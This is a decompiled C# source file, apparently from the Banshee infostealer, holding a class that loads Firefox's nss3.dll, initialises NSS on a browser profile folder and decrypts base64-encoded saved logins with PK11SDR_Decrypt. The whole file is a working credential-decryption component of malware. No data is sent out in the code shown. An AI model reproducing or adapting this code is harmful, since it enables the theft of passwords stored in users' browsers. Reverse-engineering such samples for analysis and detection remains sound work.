﻿using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Banshee.Helper.Encrypted
{
	// Token: 0x020000E9 RID: 233
	public static class NSSDecryptor
	{
		// Token: 0x0600030C RID: 780
		[DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
		private static extern int NSS_Init(string configdir);

		// Token: 0x0600030D RID: 781
		[DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
		private static extern int NSS_Shutdown();

		// Token: 0x0600030E RID: 782
		[DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
		private static extern int PK11SDR_Decrypt(ref NSSDecryptor.SECItem data, ref NSSDecryptor.SECItem result, int cx);

		// Token: 0x0600030F RID: 783 RVA: 0x000180B4 File Offset: 0x000180B4
		public static bool Initialize(string profilePath)
		{
			bool result;
			try
			{
				string text = "C:\\Program Files\\Mozilla Firefox";
				if (!Directory.Exists(text))
				{
					result = false;
				}
				else
				{
					string text2 = Environment.GetEnvironmentVariable("PATH");
					text2 = text2 + ";" + text;
					Environment.SetEnvironmentVariable("PATH", text2);
					result = (NSSDecryptor.NSS_Init(profilePath) == 0);
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000310 RID: 784 RVA: 0x00018118 File Offset: 0x00018118
		public static string Decrypt(string base64)
		{
			string result;
			try
			{
				byte[] array = Convert.FromBase64String(base64);
				if (array.Length == 0)
				{
					result = null;
				}
				else
				{
					NSSDecryptor.SECItem secitem = new NSSDecryptor.SECItem
					{
						Data = Marshal.AllocHGlobal(array.Length),
						Len = array.Length,
						Type = 0
					};
					Marshal.Copy(array, 0, secitem.Data, array.Length);
					NSSDecryptor.SECItem secitem2 = default(NSSDecryptor.SECItem);
					bool flag = NSSDecryptor.PK11SDR_Decrypt(ref secitem, ref secitem2, 0) != 0;
					Marshal.FreeHGlobal(secitem.Data);
					if (flag || secitem2.Data == IntPtr.Zero)
					{
						result = null;
					}
					else
					{
						byte[] array2 = new byte[secitem2.Len];
						Marshal.Copy(secitem2.Data, array2, 0, secitem2.Len);
						result = Encoding.UTF8.GetString(array2);
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x020000EA RID: 234
		public struct SECItem
		{
			// Token: 0x04000255 RID: 597
			public int Type;

			// Token: 0x04000256 RID: 598
			public IntPtr Data;

			// Token: 0x04000257 RID: 599
			public int Len;
		}
	}
}
